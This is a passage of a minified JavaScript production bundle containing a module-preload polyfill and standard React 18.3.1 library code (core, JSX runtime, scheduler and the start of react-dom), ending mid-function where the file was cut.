function Bh(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const a in r)
                if (a !== "default" && !(a in e)) {
                    const o = Object.getOwnPropertyDescriptor(r, a);
                    o && Object.defineProperty(e, a, o.get ? o : {
                        enumerable: !0,
                        get: () => r[a]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }))
}
(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload"))
        return;
    for (const a of document.querySelectorAll('link[rel="modulepreload"]'))
        r(a);
    new MutationObserver(a => {
        for (const o of a)
            if (o.type === "childList")
                for (const i of o.addedNodes)
                    i.tagName === "LINK" && i.rel === "modulepreload" && r(i)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function n(a) {
        const o = {};
        return a.integrity && (o.integrity = a.integrity),
        a.referrerPolicy && (o.referrerPolicy = a.referrerPolicy),
        a.crossOrigin === "use-credentials" ? o.credentials = "include" : a.crossOrigin === "anonymous" ? o.credentials = "omit" : o.credentials = "same-origin",
        o
    }
    function r(a) {
        if (a.ep)
            return;
        a.ep = !0;
        const o = n(a);
        fetch(a.href, o)
    }
}
)();
var Ai = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {};
function hi(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var $h = {
    exports: {}
}
  , nl = {}
  , Hh = {
    exports: {}
}
  , Ve = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var mi = Symbol.for("react.element")
  , z1 = Symbol.for("react.portal")
  , F1 = Symbol.for("react.fragment")
  , U1 = Symbol.for("react.strict_mode")
  , B1 = Symbol.for("react.profiler")
  , $1 = Symbol.for("react.provider")
  , H1 = Symbol.for("react.context")
  , V1 = Symbol.for("react.forward_ref")
  , W1 = Symbol.for("react.suspense")
  , K1 = Symbol.for("react.memo")
  , G1 = Symbol.for("react.lazy")
  , dd = Symbol.iterator;
function Y1(e) {
    return e === null || typeof e != "object" ? null : (e = dd && e[dd] || e["@@iterator"],
    typeof e == "function" ? e : null)
}
var Vh = {
    isMounted: function() {
        return !1
    },
    enqueueForceUpdate: function() {},
    enqueueReplaceState: function() {},
    enqueueSetState: function() {}
}
  , Wh = Object.assign
  , Kh = {};
function Ja(e, t, n) {
    this.props = e,
    this.context = t,
    this.refs = Kh,
    this.updater = n || Vh
}
Ja.prototype.isReactComponent = {};
Ja.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null)
        throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
}
;
Ja.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
}
;
function Gh() {}
Gh.prototype = Ja.prototype;
function Hc(e, t, n) {
    this.props = e,
    this.context = t,
    this.refs = Kh,
    this.updater = n || Vh
}
var Vc = Hc.prototype = new Gh;
Vc.constructor = Hc;
Wh(Vc, Ja.prototype);
Vc.isPureReactComponent = !0;
var pd = Array.isArray
  , Yh = Object.prototype.hasOwnProperty
  , Wc = {
    current: null
}
  , Qh = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function Xh(e, t, n) {
    var r, a = {}, o = null, i = null;
    if (t != null)
        for (r in t.ref !== void 0 && (i = t.ref),
        t.key !== void 0 && (o = "" + t.key),
        t)
            Yh.call(t, r) && !Qh.hasOwnProperty(r) && (a[r] = t[r]);
    var s = arguments.length - 2;
    if (s === 1)
        a.children = n;
    else if (1 < s) {
        for (var u = Array(s), c = 0; c < s; c++)
            u[c] = arguments[c + 2];
        a.children = u
    }
    if (e && e.defaultProps)
        for (r in s = e.defaultProps,
        s)
            a[r] === void 0 && (a[r] = s[r]);
    return {
        $$typeof: mi,
        type: e,
        key: o,
        ref: i,
        props: a,
        _owner: Wc.current
    }
}
function Q1(e, t) {
    return {
        $$typeof: mi,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}
function Kc(e) {
    return typeof e == "object" && e !== null && e.$$typeof === mi
}
function X1(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var hd = /\/+/g;
function Ll(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? X1("" + e.key) : t.toString(36)
}
function es(e, t, n, r, a) {
    var o = typeof e;
    (o === "undefined" || o === "boolean") && (e = null);
    var i = !1;
    if (e === null)
        i = !0;
    else
        switch (o) {
        case "string":
        case "number":
            i = !0;
            break;
        case "object":
            switch (e.$$typeof) {
            case mi:
            case z1:
                i = !0
            }
        }
    if (i)
        return i = e,
        a = a(i),
        e = r === "" ? "." + Ll(i, 0) : r,
        pd(a) ? (n = "",
        e != null && (n = e.replace(hd, "$&/") + "/"),
        es(a, t, n, "", function(c) {
            return c
        })) : a != null && (Kc(a) && (a = Q1(a, n + (!a.key || i && i.key === a.key ? "" : ("" + a.key).replace(hd, "$&/") + "/") + e)),
        t.push(a)),
        1;
    if (i = 0,
    r = r === "" ? "." : r + ":",
    pd(e))
        for (var s = 0; s < e.length; s++) {
            o = e[s];
            var u = r + Ll(o, s);
            i += es(o, t, n, u, a)
        }
    else if (u = Y1(e),
    typeof u == "function")
        for (e = u.call(e),
        s = 0; !(o = e.next()).done; )
            o = o.value,
            u = r + Ll(o, s++),
            i += es(o, t, n, u, a);
    else if (o === "object")
        throw t = String(e),
        Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return i
}
function Li(e, t, n) {
    if (e == null)
        return e;
    var r = []
      , a = 0;
    return es(e, r, "", "", function(o) {
        return t.call(n, o, a++)
    }),
    r
}
function q1(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(),
        t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1,
            e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2,
            e._result = n)
        }),
        e._status === -1 && (e._status = 0,
        e._result = t)
    }
    if (e._status === 1)
        return e._result.default;
    throw e._result
}
var Vt = {
    current: null
}
  , ts = {
    transition: null
}
  , J1 = {
    ReactCurrentDispatcher: Vt,
    ReactCurrentBatchConfig: ts,
    ReactCurrentOwner: Wc
};
function qh() {
    throw Error("act(...) is not supported in production builds of React.")
}
Ve.Children = {
    map: Li,
    forEach: function(e, t, n) {
        Li(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return Li(e, function() {
            t++
        }),
        t
    },
    toArray: function(e) {
        return Li(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!Kc(e))
            throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
Ve.Component = Ja;
Ve.Fragment = F1;
Ve.Profiler = B1;
Ve.PureComponent = Hc;
Ve.StrictMode = U1;
Ve.Suspense = W1;
Ve.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = J1;
Ve.act = qh;
Ve.cloneElement = function(e, t, n) {
    if (e == null)
        throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = Wh({}, e.props)
      , a = e.key
      , o = e.ref
      , i = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (o = t.ref,
        i = Wc.current),
        t.key !== void 0 && (a = "" + t.key),
        e.type && e.type.defaultProps)
            var s = e.type.defaultProps;
        for (u in t)
            Yh.call(t, u) && !Qh.hasOwnProperty(u) && (r[u] = t[u] === void 0 && s !== void 0 ? s[u] : t[u])
    }
    var u = arguments.length - 2;
    if (u === 1)
        r.children = n;
    else if (1 < u) {
        s = Array(u);
        for (var c = 0; c < u; c++)
            s[c] = arguments[c + 2];
        r.children = s
    }
    return {
        $$typeof: mi,
        type: e.type,
        key: a,
        ref: o,
        props: r,
        _owner: i
    }
}
;
Ve.createContext = function(e) {
    return e = {
        $$typeof: H1,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    },
    e.Provider = {
        $$typeof: $1,
        _context: e
    },
    e.Consumer = e
}
;
Ve.createElement = Xh;
Ve.createFactory = function(e) {
    var t = Xh.bind(null, e);
    return t.type = e,
    t
}
;
Ve.createRef = function() {
    return {
        current: null
    }
}
;
Ve.forwardRef = function(e) {
    return {
        $$typeof: V1,
        render: e
    }
}
;
Ve.isValidElement = Kc;
Ve.lazy = function(e) {
    return {
        $$typeof: G1,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: q1
    }
}
;
Ve.memo = function(e, t) {
    return {
        $$typeof: K1,
        type: e,
        compare: t === void 0 ? null : t
    }
}
;
Ve.startTransition = function(e) {
    var t = ts.transition;
    ts.transition = {};
    try {
        e()
    } finally {
        ts.transition = t
    }
}
;
Ve.unstable_act = qh;
Ve.useCallback = function(e, t) {
    return Vt.current.useCallback(e, t)
}
;
Ve.useContext = function(e) {
    return Vt.current.useContext(e)
}
;
Ve.useDebugValue = function() {}
;
Ve.useDeferredValue = function(e) {
    return Vt.current.useDeferredValue(e)
}
;
Ve.useEffect = function(e, t) {
    return Vt.current.useEffect(e, t)
}
;
Ve.useId = function() {
    return Vt.current.useId()
}
;
Ve.useImperativeHandle = function(e, t, n) {
    return Vt.current.useImperativeHandle(e, t, n)
}
;
Ve.useInsertionEffect = function(e, t) {
    return Vt.current.useInsertionEffect(e, t)
}
;
Ve.useLayoutEffect = function(e, t) {
    return Vt.current.useLayoutEffect(e, t)
}
;
Ve.useMemo = function(e, t) {
    return Vt.current.useMemo(e, t)
}
;
Ve.useReducer = function(e, t, n) {
    return Vt.current.useReducer(e, t, n)
}
;
Ve.useRef = function(e) {
    return Vt.current.useRef(e)
}
;
Ve.useState = function(e) {
    return Vt.current.useState(e)
}
;
Ve.useSyncExternalStore = function(e, t, n) {
    return Vt.current.useSyncExternalStore(e, t, n)
}
;
Ve.useTransition = function() {
    return Vt.current.useTransition()
}
;
Ve.version = "18.3.1";
Hh.exports = Ve;
var j = Hh.exports;
const Gc = hi(j)
  , Z1 = Bh({
    __proto__: null,
    default: Gc
}, [j]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var ey = j
  , ty = Symbol.for("react.element")
  , ny = Symbol.for("react.fragment")
  , ry = Object.prototype.hasOwnProperty
  , ay = ey.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner
  , oy = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function Jh(e, t, n) {
    var r, a = {}, o = null, i = null;
    n !== void 0 && (o = "" + n),
    t.key !== void 0 && (o = "" + t.key),
    t.ref !== void 0 && (i = t.ref);
    for (r in t)
        ry.call(t, r) && !oy.hasOwnProperty(r) && (a[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps,
        t)
            a[r] === void 0 && (a[r] = t[r]);
    return {
        $$typeof: ty,
        type: e,
        key: o,
        ref: i,
        props: a,
        _owner: ay.current
    }
}
nl.Fragment = ny;
nl.jsx = Jh;
nl.jsxs = Jh;
$h.exports = nl;
var l = $h.exports
  , Zh = {
    exports: {}
}
  , dn = {}
  , em = {
    exports: {}
}
  , tm = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(V, le) {
        var z = V.length;
        V.push(le);
        e: for (; 0 < z; ) {
            var M = z - 1 >>> 1
              , Y = V[M];
            if (0 < a(Y, le))
                V[M] = le,
                V[z] = Y,
                z = M;
            else
                break e
        }
    }
    function n(V) {
        return V.length === 0 ? null : V[0]
    }
    function r(V) {
        if (V.length === 0)
            return null;
        var le = V[0]
          , z = V.pop();
        if (z !== le) {
            V[0] = z;
            e: for (var M = 0, Y = V.length, ge = Y >>> 1; M < ge; ) {
                var W = 2 * (M + 1) - 1
                  , b = V[W]
                  , xe = W + 1
                  , ce = V[xe];
                if (0 > a(b, z))
                    xe < Y && 0 > a(ce, b) ? (V[M] = ce,
                    V[xe] = z,
                    M = xe) : (V[M] = b,
                    V[W] = z,
                    M = W);
                else if (xe < Y && 0 > a(ce, z))
                    V[M] = ce,
                    V[xe] = z,
                    M = xe;
                else
                    break e
            }
        }
        return le
    }
    function a(V, le) {
        var z = V.sortIndex - le.sortIndex;
        return z !== 0 ? z : V.id - le.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var o = performance;
        e.unstable_now = function() {
            return o.now()
        }
    } else {
        var i = Date
          , s = i.now();
        e.unstable_now = function() {
            return i.now() - s
        }
    }
    var u = []
      , c = []
      , f = 1
      , d = null
      , h = 3
      , N = !1
      , y = !1
      , S = !1
      , x = typeof setTimeout == "function" ? setTimeout : null
      , g = typeof clearTimeout == "function" ? clearTimeout : null
      , p = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);
    function m(V) {
        for (var le = n(c); le !== null; ) {
            if (le.callback === null)
                r(c);
            else if (le.startTime <= V)
                r(c),
                le.sortIndex = le.expirationTime,
                t(u, le);
            else
                break;
            le = n(c)
        }
    }
    function C(V) {
        if (S = !1,
        m(V),
        !y)
            if (n(u) !== null)
                y = !0,
                J(k);
            else {
                var le = n(c);
                le !== null && Q(C, le.startTime - V)
            }
    }
    function k(V, le) {
        y = !1,
        S && (S = !1,
        g(P),
        P = -1),
        N = !0;
        var z = h;
        try {
            for (m(le),
            d = n(u); d !== null && (!(d.expirationTime > le) || V && !Se()); ) {
                var M = d.callback;
                if (typeof M == "function") {
                    d.callback = null,
                    h = d.priorityLevel;
                    var Y = M(d.expirationTime <= le);
                    le = e.unstable_now(),
                    typeof Y == "function" ? d.callback = Y : d === n(u) && r(u),
                    m(le)
                } else
                    r(u);
                d = n(u)
            }
            if (d !== null)
                var ge = !0;
            else {
                var W = n(c);
                W !== null && Q(C, W.startTime - le),
                ge = !1
            }
            return ge
        } finally {
            d = null,
            h = z,
            N = !1
        }
    }
    var w = !1
      , A = null
      , P = -1
      , K = 5
      , $ = -1;
    function Se() {
        return !(e.unstable_now() - $ < K)
    }
    function Te() {
        if (A !== null) {
            var V = e.unstable_now();
            $ = V;
            var le = !0;
            try {
                le = A(!0, V)
            } finally {
                le ? Ae() : (w = !1,
                A = null)
            }
        } else
            w = !1
    }
    var Ae;
    if (typeof p == "function")
        Ae = function() {
            p(Te)
        }
        ;
    else if (typeof MessageChannel < "u") {
        var H = new MessageChannel
          , X = H.port2;
        H.port1.onmessage = Te,
        Ae = function() {
            X.postMessage(null)
        }
    } else
        Ae = function() {
            x(Te, 0)
        }
        ;
    function J(V) {
        A = V,
        w || (w = !0,
        Ae())
    }
    function Q(V, le) {
        P = x(function() {
            V(e.unstable_now())
        }, le)
    }
    e.unstable_IdlePriority = 5,
    e.unstable_ImmediatePriority = 1,
    e.unstable_LowPriority = 4,
    e.unstable_NormalPriority = 3,
    e.unstable_Profiling = null,
    e.unstable_UserBlockingPriority = 2,
    e.unstable_cancelCallback = function(V) {
        V.callback = null
    }
    ,
    e.unstable_continueExecution = function() {
        y || N || (y = !0,
        J(k))
    }
    ,
    e.unstable_forceFrameRate = function(V) {
        0 > V || 125 < V ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : K = 0 < V ? Math.floor(1e3 / V) : 5
    }
    ,
    e.unstable_getCurrentPriorityLevel = function() {
        return h
    }
    ,
    e.unstable_getFirstCallbackNode = function() {
        return n(u)
    }
    ,
    e.unstable_next = function(V) {
        switch (h) {
        case 1:
        case 2:
        case 3:
            var le = 3;
            break;
        default:
            le = h
        }
        var z = h;
        h = le;
        try {
            return V()
        } finally {
            h = z
        }
    }
    ,
    e.unstable_pauseExecution = function() {}
    ,
    e.unstable_requestPaint = function() {}
    ,
    e.unstable_runWithPriority = function(V, le) {
        switch (V) {
        case 1:
        case 2:
        case 3:
        case 4:
        case 5:
            break;
        default:
            V = 3
        }
        var z = h;
        h = V;
        try {
            return le()
        } finally {
            h = z
        }
    }
    ,
    e.unstable_scheduleCallback = function(V, le, z) {
        var M = e.unstable_now();
        switch (typeof z == "object" && z !== null ? (z = z.delay,
        z = typeof z == "number" && 0 < z ? M + z : M) : z = M,
        V) {
        case 1:
            var Y = -1;
            break;
        case 2:
            Y = 250;
            break;
        case 5:
            Y = 1073741823;
            break;
        case 4:
            Y = 1e4;
            break;
        default:
            Y = 5e3
        }
        return Y = z + Y,
        V = {
            id: f++,
            callback: le,
            priorityLevel: V,
            startTime: z,
            expirationTime: Y,
            sortIndex: -1
        },
        z > M ? (V.sortIndex = z,
        t(c, V),
        n(u) === null && V === n(c) && (S ? (g(P),
        P = -1) : S = !0,
        Q(C, z - M))) : (V.sortIndex = Y,
        t(u, V),
        y || N || (y = !0,
        J(k))),
        V
    }
    ,
    e.unstable_shouldYield = Se,
    e.unstable_wrapCallback = function(V) {
        var le = h;
        return function() {
            var z = h;
            h = le;
            try {
                return V.apply(this, arguments)
            } finally {
                h = z
            }
        }
    }
}
)(tm);
em.exports = tm;
var iy = em.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var sy = j
  , fn = iy;
function G(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++)
        t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var nm = new Set
  , Wo = {};
function da(e, t) {
    $a(e, t),
    $a(e + "Capture", t)
}
function $a(e, t) {
    for (Wo[e] = t,
    e = 0; e < t.length; e++)
        nm.add(t[e])
}
var Yn = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
  , Su = Object.prototype.hasOwnProperty
  , ly = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/
  , md = {}
  , gd = {};
function uy(e) {
    return Su.call(gd, e) ? !0 : Su.call(md, e) ? !1 : ly.test(e) ? gd[e] = !0 : (md[e] = !0,
    !1)
}
function cy(e, t, n, r) {
    if (n !== null && n.type === 0)
        return !1;
    switch (typeof t) {
    case "function":
    case "symbol":
        return !0;
    case "boolean":
        return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5),
        e !== "data-" && e !== "aria-");
    default:
        return !1
    }
}
function fy(e, t, n, r) {
    if (t === null || typeof t > "u" || cy(e, t, n, r))
        return !0;
    if (r)
        return !1;
    if (n !== null)
        switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
        }
    return !1
}
function Wt(e, t, n, r, a, o, i) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4,
    this.attributeName = r,
    this.attributeNamespace = a,
    this.mustUseProperty = n,
    this.propertyName = e,
    this.type = t,
    this.sanitizeURL = o,
    this.removeEmptyString = i
}
var Dt = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    Dt[e] = new Wt(e,0,!1,e,null,!1,!1)
});
[["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function(e) {
    var t = e[0];
    Dt[t] = new Wt(t,1,!1,e[1],null,!1,!1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    Dt[e] = new Wt(e,2,!1,e.toLowerCase(),null,!1,!1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    Dt[e] = new Wt(e,2,!1,e,null,!1,!1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    Dt[e] = new Wt(e,3,!1,e.toLowerCase(),null,!1,!1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    Dt[e] = new Wt(e,3,!0,e,null,!1,!1)
});
["capture", "download"].forEach(function(e) {
    Dt[e] = new Wt(e,4,!1,e,null,!1,!1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    Dt[e] = new Wt(e,6,!1,e,null,!1,!1)
});
["rowSpan", "start"].forEach(function(e) {
    Dt[e] = new Wt(e,5,!1,e.toLowerCase(),null,!1,!1)
});
var Yc = /[\-:]([a-z])/g;
function Qc(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(Yc, Qc);
    Dt[t] = new Wt(t,1,!1,e,null,!1,!1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(Yc, Qc);
    Dt[t] = new Wt(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(Yc, Qc);
    Dt[t] = new Wt(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    Dt[e] = new Wt(e,1,!1,e.toLowerCase(),null,!1,!1)
});
Dt.xlinkHref = new Wt("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);
["src", "href", "action", "formAction"].forEach(function(e) {
    Dt[e] = new Wt(e,1,!1,e.toLowerCase(),null,!0,!0)
});
function Xc(e, t, n, r) {
    var a = Dt.hasOwnProperty(t) ? Dt[t] : null;
    (a !== null ? a.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (fy(t, n, a, r) && (n = null),
    r || a === null ? uy(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : a.mustUseProperty ? e[a.propertyName] = n === null ? a.type === 3 ? !1 : "" : n : (t = a.attributeName,
    r = a.attributeNamespace,
    n === null ? e.removeAttribute(t) : (a = a.type,
    n = a === 3 || a === 4 && n === !0 ? "" : "" + n,
    r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var er = sy.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED
  , Ii = Symbol.for("react.element")
  , ba = Symbol.for("react.portal")
  , Sa = Symbol.for("react.fragment")
  , qc = Symbol.for("react.strict_mode")
  , Nu = Symbol.for("react.profiler")
  , rm = Symbol.for("react.provider")
  , am = Symbol.for("react.context")
  , Jc = Symbol.for("react.forward_ref")
  , Cu = Symbol.for("react.suspense")
  , ku = Symbol.for("react.suspense_list")
  , Zc = Symbol.for("react.memo")
  , fr = Symbol.for("react.lazy")
  , om = Symbol.for("react.offscreen")
  , yd = Symbol.iterator;
function fo(e) {
    return e === null || typeof e != "object" ? null : (e = yd && e[yd] || e["@@iterator"],
    typeof e == "function" ? e : null)
}
var xt = Object.assign, Il;
function jo(e) {
    if (Il === void 0)
        try {
            throw Error()
        } catch (n) {
            var t = n.stack.trim().match(/\n( *(at )?)/);
            Il = t && t[1] || ""
        }
    return `
` + Il + e
}
var Ml = !1;
function Dl(e, t) {
    if (!e || Ml)
        return "";
    Ml = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                throw Error()
            }
            ,
            Object.defineProperty(t.prototype, "props", {
                set: function() {
                    throw Error()
                }
            }),
            typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (c) {
                    var r = c
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (c) {
                    r = c
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (c) {
                r = c
            }
            e()
        }
    } catch (c) {
        if (c && r && typeof c.stack == "string") {
            for (var a = c.stack.split(`
`), o = r.stack.split(`
`), i = a.length - 1, s = o.length - 1; 1 <= i && 0 <= s && a[i] !== o[s]; )
                s--;
            for (; 1 <= i && 0 <= s; i--,
            s--)
                if (a[i] !== o[s]) {
                    if (i !== 1 || s !== 1)
                        do
                            if (i--,
                            s--,
                            0 > s || a[i] !== o[s]) {
                                var u = `
` + a[i].replace(" at new ", " at ");
                                return e.displayName && u.includes("<anonymous>") && (u = u.replace("<anonymous>", e.displayName)),
                                u
                            }
                        while (1 <= i && 0 <= s);
                    break
                }
        }
    } finally {
        Ml = !1,
        Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? jo(e) : ""
}
function dy(e) {
    switch (e.tag) {
    case 5:
        return jo(e.type);
    case 16:
        return jo("Lazy");
    case 13:
        return jo("Suspense");
    case 19:
        return jo("SuspenseList");
    case 0:
    case 2:
    case 15:
        return e = Dl(e.type, !1),
        e;
    case 11:
        return e = Dl(e.type.render, !1),
        e;
    case 1:
        return e = Dl(e.type, !0),
        e;
    default:
        return ""
    }
}
function ju(e) {
    if (e == null)
        return null;
    if (typeof e == "function")
        return e.displayName || e.name || null;
    if (typeof e == "string")
        return e;
    switch (e) {
    case Sa:
        return "Fragment";
    case ba:
        return "Portal";
    case Nu:
        return "Profiler";
    case qc:
        return "StrictMode";
    case Cu:
        return "Suspense";
    case ku:
        return "SuspenseList"
    }
    if (typeof e == "object")
        switch (e.$$typeof) {
        case am:
            return (e.displayName || "Context") + ".Consumer";
        case rm:
            return (e._context.displayName || "Context") + ".Provider";
        case Jc:
            var t = e.render;
            return e = e.displayName,
            e || (e = t.displayName || t.name || "",
            e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"),
            e;
        case Zc:
            return t = e.displayName || null,
            t !== null ? t : ju(e.type) || "Memo";
        case fr:
            t = e._payload,
            e = e._init;
            try {
                return ju(e(t))
            } catch {}
        }
    return null
}
function py(e) {
    var t = e.type;
    switch (e.tag) {
    case 24:
        return "Cache";
    case 9:
        return (t.displayName || "Context") + ".Consumer";
    case 10:
        return (t._context.displayName || "Context") + ".Provider";
    case 18:
        return "DehydratedFragment";
    case 11:
        return e = t.render,
        e = e.displayName || e.name || "",
        t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
    case 7:
        return "Fragment";
    case 5:
        return t;
    case 4:
        return "Portal";
    case 3:
        return "Root";
    case 6:
        return "Text";
    case 16:
        return ju(t);
    case 8:
        return t === qc ? "StrictMode" : "Mode";
    case 22:
        return "Offscreen";
    case 12:
        return "Profiler";
    case 21:
        return "Scope";
    case 13:
        return "Suspense";
    case 19:
        return "SuspenseList";
    case 25:
        return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
        if (typeof t == "function")
            return t.displayName || t.name || null;
        if (typeof t == "string")
            return t
    }
    return null
}
function Er(e) {
    switch (typeof e) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
        return e;
    case "object":
        return e;
    default:
        return ""
    }
}
function im(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}
function hy(e) {
    var t = im(e) ? "checked" : "value"
      , n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t)
      , r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var a = n.get
          , o = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return a.call(this)
            },
            set: function(i) {
                r = "" + i,
                o.call(this, i)
            }
        }),
        Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }),
        {
            getValue: function() {
                return r
            },
            setValue: function(i) {
                r = "" + i
            },
            stopTracking: function() {
                e._valueTracker = null,
                delete e[t]
            }
        }
